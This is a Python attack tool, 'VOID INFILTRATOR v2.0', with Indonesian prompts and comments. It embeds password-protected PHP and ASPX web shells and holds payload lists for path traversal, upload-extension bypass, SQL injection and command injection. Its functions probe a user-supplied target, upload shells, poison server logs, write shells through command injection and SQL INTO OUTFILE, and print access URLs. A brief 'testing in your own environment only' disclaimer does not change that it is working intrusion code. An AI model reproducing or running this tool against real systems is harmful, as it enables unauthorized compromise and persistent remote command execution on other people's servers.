#!/usr/bin/env python3
"""
VOID INFILTRATOR v2.0 - Professional WebShell Deployer
Multi‑vector Exploit + WAF Bypass + Auto‑Deploy + WebShell UI
HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI
"""

import os
import sys
import re
import time
import json
import socket
import random
import base64
import urllib.parse
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote_plus, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except:
    os.system("pip install requests")
    import requests

# ========================================
# KONFIGURASI
# ========================================
VERSION = "2.0"
TIMEOUT = 10
VERBOSE = True
MAX_THREADS = 30

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.2 Safari/605.1.15",
]

# ========================================
# WEBSHELL CODE (DENGAN UI)
# ========================================
WEBSHELL_PHP = """<?php
// VOID SHELL v2.0 - Web-based Terminal
$password = "void123";
if (isset($_GET['p']) && $_GET['p'] !== $password) { die("Access Denied"); }
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre style='background:#0b0e14;color:#7ee07e;padding:15px;border-radius:8px;font-family:monospace;'>";
    system($cmd);
    echo "</pre>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>VOID SHELL</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0b0e14; color:#c8d0dc; font-family:monospace; padding:20px; }
.container { max-width:900px; margin:0 auto; background:#141a22; padding:25px; border-radius:12px; border:1px solid #2a3340; }
.logo { color:#ff6b6b; text-align:center; font-size:22px; margin-bottom:20px; }
input, button { background:#0f151e; border:1px solid #2a3340; color:#c8d0dc; padding:12px; border-radius:6px; width:100%; font-family:monospace; }
button { background:#2ecc71; color:#000; font-weight:bold; cursor:pointer; width:auto; margin-top:10px; }
#output { background:#0b1018; padding:15px; border-radius:8px; margin-top:15px; min-height:200px; overflow:auto; }
.footer { text-align:center; color:#3e5367; margin-top:20px; font-size:12px; }
</style>
</head>
<body>
<div class="container">
<div class="logo">⚡ VOID INFILTRATOR SHELL</div>
<form method="GET">
<input type="hidden" name="p" value="void123">
<input type="text" name="cmd" placeholder="Masukkan perintah (contoh: whoami, ls, id)" autofocus>
<button type="submit">⏎ EXECUTE</button>
</form>
<div id="output">
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre style='background:#0b1018;color:#7ee07e;padding:15px;border-radius:8px;font-family:monospace;'>";
    system($cmd);
    echo "</pre>";
}
?>
</div>
<div class="footer">VOID SHELL · Hanya untuk pengujian lab</div>
</div>
</body>
</html>
"""

WEBSHELL_ASPX = """<%@ Page Language="C#" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string password = "void123";
    if (Request.QueryString["p"] != password) { Response.Write("Access Denied"); return; }
    string cmd = Request.QueryString["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        System.Diagnostics.Process process = new System.Diagnostics.Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.Arguments = "/c " + cmd;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardOutput = true;
        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }
}
</script>
<!DOCTYPE html>
<html><head><title>VOID SHELL</title>
<style>
body{background:#0b0e14;color:#c8d0dc;font-family:monospace;padding:20px;}
.container{max-width:900px;margin:0 auto;background:#141a22;padding:25px;border-radius:12px;border:1px solid #2a3340;}
.logo{color:#ff6b6b;text-align:center;font-size:22px;margin-bottom:20px;}
input,button{background:#0f151e;border:1px solid #2a3340;color:#c8d0dc;padding:12px;border-radius:6px;width:100%;font-family:monospace;}
button{background:#2ecc71;color:#000;font-weight:bold;cursor:pointer;width:auto;margin-top:10px;}
#output{background:#0b1018;padding:15px;border-radius:8px;margin-top:15px;min-height:200px;overflow:auto;}
</style>
</head>
<body>
<div class="container">
<div class="logo">⚡ VOID INFILTRATOR SHELL</div>
<form method="GET">
<input type="hidden" name="p" value="void123">
<input type="text" name="cmd" placeholder="Masukkan perintah">
<button type="submit">⏎ EXECUTE</button>
</form>
<div id="output">
<pre><% if(!string.IsNullOrEmpty(Request.QueryString["cmd"])) { 
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
    p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true;
    p.Start(); Response.Write(p.StandardOutput.ReadToEnd());
} %></pre>
</div>
</div>
</body></html>
"""

# ========================================
# UTILITY FUNCTIONS
# ========================================
def print_banner():
    print("""
   ╔═══════════════════════════════════════════════════════╗
   ║     V O I D   I N F I L T R A T O R   v2.0          ║
   ║   Professional WebShell Deployer + WAF Bypass        ║
   ╚═══════════════════════════════════════════════════════╝
    """)

def get_session():
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    return s

def safe_request(url, method="GET", params=None, data=None, files=None, timeout=TIMEOUT):
    try:
        s = get_session()
        if method.upper() == "GET":
            r = s.get(url, params=params, timeout=timeout)
        else:
            r = s.post(url, data=data, files=files, timeout=timeout)
        time.sleep(random.uniform(0.3, 0.8))
        return r
    except Exception as e:
        if VERBOSE: print(f"  [!] Request error: {e}")
        return None

def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None

# ========================================
# BYPASS PAYLOADS
# ========================================
BYPASS_TECHNIQUES = {
    "lfi": [
        "../../../../windows/win.ini",
        "..%252f..%252f..%252f..%252fwindows/win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "....//....//....//....//windows/win.ini",
        "../../../../windows/win.ini%00",
        "c:/windows/win.ini",
        "file:///c:/windows/win.ini"
    ],
    "upload": [
        "shell.php;.jpg",
        "shell.php%00.jpg",
        "shell.php.jpg",
        "shell.aspx;.jpg",
        "shell.aspx%00.jpg",
        "shell.aspx.jpg"
    ],
    "sqli": [
        "' OR '1'='1",
        "%27%20OR%20%271%27%3D%271",
        "1' OR '1'='1'/*",
        "1' OR 1=1-- -",
        "1' UNION SELECT NULL--",
        "1' AND SLEEP(3)--"
    ],
    "rce": [
        "; whoami",
        "%3B whoami",
        "| whoami",
        "%7C whoami",
        "& whoami",
        "%26 whoami",
        "|| whoami",
        "| ipconfig",
        "; ipconfig"
    ]
}

# ========================================
# MODUL: EXPLOIT & DEPLOY WEBSHELL
# ========================================
def exploit_upload(target, proto):
    print(f"\n\033[1;33m[+] ATTEMPT UPLOAD + BYPASS\033[0m")
    base = f"{proto}://{target}"
    upload_paths = ["/upload", "/uploads", "/fileupload", "/upload.php", "/upload.aspx", "/admin/upload", "/api/upload"]
    for path in upload_paths:
        url = urljoin(base, path)
        r = safe_request(url)
        if r and r.status_code in [200, 403]:
            print(f"  [✓] Upload endpoint: {url}")
            for ext in BYPASS_TECHNIQUES["upload"]:
                shell_code = WEBSHELL_ASPX if ".aspx" in path else WEBSHELL_PHP
                files = {'file': (ext, shell_code, 'application/octet-stream')}
                r2 = safe_request(url, method="POST", files=files)
                if r2:
                    if "Access Denied" in r2.text or "TEST" in r2.text:
                        print(f"  [✓] Upload successful with {ext}!")
                        shell_url = urljoin(url, ext)
                        print(f"  [✓] Shell deployed: {shell_url}?p=void123&cmd=whoami")
                        return {"url": shell_url, "type": "aspx" if ".aspx" in path else "php"}
                    elif r2.status_code == 200 and ("shell" in r2.text.lower() or "upload" in r2.text.lower()):
                        print(f"  [✓] Possible upload success with {ext} (check manually)")
                        return {"url": urljoin(url, ext), "type": "aspx" if ".aspx" in path else "php"}
    print("  [✗] Upload exploit failed")
    return None

def exploit_lfi(target, proto):
    print(f"\n\033[1;33m[+] ATTEMPT LFI + LOG POISONING\033[0m")
    base = f"{proto}://{target}"
    params = ["id", "page", "file", "path", "doc", "view", "include", "load", "cmd", "exec"]
    for p in params:
        for payload in BYPASS_TECHNIQUES["lfi"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("[extensions]" in r.text or "hosts" in r.text):
                print(f"  [✓] LFI confirmed on '{p}' with {payload[:30]}...")
                # Log poisoning via User-Agent
                log_path = "../../../../inetpub/logs/LogFiles/W3SVC1/u_ex" + datetime.now().strftime("%y%m%d") + ".log"
                inject_payload = "<?php system($_GET['cmd']); ?>"
                headers = {"User-Agent": inject_payload}
                try:
                    requests.get(f"{base}?{p}=test", headers=headers, timeout=5)
                    print(f"  [✓] Log poisoning injected!")
                    shell_url = f"{base}?{p}={quote_plus(log_path)}&p=void123&cmd=whoami"
                    print(f"  [✓] Access shell via: {shell_url}")
                    return {"url": shell_url, "type": "log_poison"}
                except:
                    pass
                break
    print("  [✗] LFI exploit failed")
    return None

def exploit_rce(target, proto):
    print(f"\n\033[1;33m[+] ATTEMPT RCE + ECHO SHELL\033[0m")
    base = f"{proto}://{target}"
    params = ["cmd", "exec", "command", "dir", "action", "system", "page", "file"]
    for p in params:
        for payload in BYPASS_TECHNIQUES["rce"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("uid=" in r.text or "user" in r.text.lower() or "ipconfig" in r.text):
                print(f"  [✓] RCE confirmed on '{p}' with {payload}")
                # Deploy webshell via echo
                shell_cmd = "echo <?php system($_GET[cmd]); ?>> C:\\inetpub\\wwwroot\\shell.php"
                url2 = f"{base}?{p}={quote_plus(shell_cmd)}"
                r2 = safe_request(url2)
                if r2 and r2.status_code == 200:
                    print(f"  [✓] Shell deployed! Access: {base}/shell.php?p=void123&cmd=whoami")
                    return {"url": f"{base}/shell.php?p=void123&cmd=whoami", "type": "php"}
                else:
                    # Try alternative path
                    shell_cmd2 = "echo <?php system($_GET[cmd]); ?>> ../wwwroot/shell.php"
                    url3 = f"{base}?{p}={quote_plus(shell_cmd2)}"
                    r3 = safe_request(url3)
                    if r3 and r3.status_code == 200:
                        print(f"  [✓] Shell deployed via alternative! Access: {base}/shell.php?p=void123&cmd=whoami")
                        return {"url": f"{base}/shell.php?p=void123&cmd=whoami", "type": "php"}
                break
    print("  [✗] RCE exploit failed")
    return None

def exploit_sqli(target, proto):
    print(f"\n\033[1;33m[+] ATTEMPT SQLi + INTO OUTFILE\033[0m")
    base = f"{proto}://{target}"
    params = ["id", "page", "cat", "product", "file", "view", "action"]
    for p in params:
        for payload in BYPASS_TECHNIQUES["sqli"]:
            url = f"{base}?{p}={quote_plus(payload)}"
            r = safe_request(url)
            if r and ("SQL" in r.text or "mysql" in r.text or "syntax" in r.text):
                print(f"  [✓] SQLi confirmed on '{p}' with {payload[:30]}...")
                # Try INTO OUTFILE
                shell_payload = " UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'--"
                url2 = f"{base}?{p}={quote_plus(shell_payload)}"
                r2 = safe_request(url2)
                if r2 and r2.status_code == 200:
                    print(f"  [✓] Shell deployed via SQLi! Access: {base}/shell.php?p=void123&cmd=whoami")
                    return {"url": f"{base}/shell.php?p=void123&cmd=whoami", "type": "php"}
                else:
                    # Try alternative path
                    shell_payload2 = " UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.php'--"
                    url3 = f"{base}?{p}={quote_plus(shell_payload2)}"
                    r3 = safe_request(url3)
                    if r3 and r3.status_code == 200:
                        print(f"  [✓] Shell deployed! Access: {base}/shell.php?p=void123&cmd=whoami")
                        return {"url": f"{base}/shell.php?p=void123&cmd=whoami", "type": "php"}
                break
    print("  [✗] SQLi exploit failed")
    return None

# ========================================
# MAIN FLOW
# ========================================
def infiltrate(target, proto):
    print("\n" + "="*60)
    print(f"\033[1;36m[+] INFILTRATING: {target}\033[0m")
    print("="*60)

    results = {}

    # Try all exploits
    results["upload"] = exploit_upload(target, proto)
    results["lfi"] = exploit_lfi(target, proto)
    results["rce"] = exploit_rce(target, proto)
    results["sqli"] = exploit_sqli(target, proto)

    # Report
    print("\n" + "="*60)
    print("\033[1;33m[LAPORAN INFILTRASI]\033[0m")
    print("="*60)
    success = False
    for k, v in results.items():
        if v:
            print(f"  \033[1;32m[✓] {k.upper()} berhasil: {v.get('url', 'N/A')}\033[0m")
            success = True
        else:
            print(f"  \033[1;31m[✗] {k.upper()} gagal\033[0m")
    print("="*60)
    if success:
        print("\033[1;32m[!] SELAMAT! Webshell berhasil ditanam. Akses URL di atas.\033[0m")
        print("\033[1;33m[!] Password default: void123 (gunakan parameter p=void123)\033[0m")
        print("\033[1;33m[!] Contoh: https://target.com/shell.php?p=void123&cmd=whoami\033[0m")
    else:
        print("\033[1;31m[!] Gagal menanam webshell. Target mungkin aman atau WAF kuat.\033[0m")

    return results

# ========================================
# MAIN
# ========================================
def main():
    global VERBOSE
    os.system('clear' if os.name != 'nt' else 'cls')
    print_banner()
    print("\033[1;33m[!] HANYA UNTUK PENGUJIAN DI LINGKUNGAN ANDA SENDIRI\033[0m")
    print(f"Version: {VERSION}\n")

    if len(sys.argv) < 2:
        target = input("\033[1;36m[?] Masukkan target (domain/IP): \033[0m").strip()
    else:
        target = sys.argv[1]
    if not target:
        print("[!] Target kosong.")
        return

    proto = "https" if input("[?] Gunakan HTTPS? (y/n): ").lower() == 'y' else "http"
    VERBOSE = input("[?] Tampilkan error? (y/n): ").lower() == 'y'

    print(f"\n[+] Target: {proto}://{target}")
    input("Tekan Enter untuk memulai infiltrasi...")

    result = infiltrate(target, proto)

    print("\n[+] Selesai.")
    input("Tekan Enter untuk keluar...")

if __name__ == "__main__":
    main()
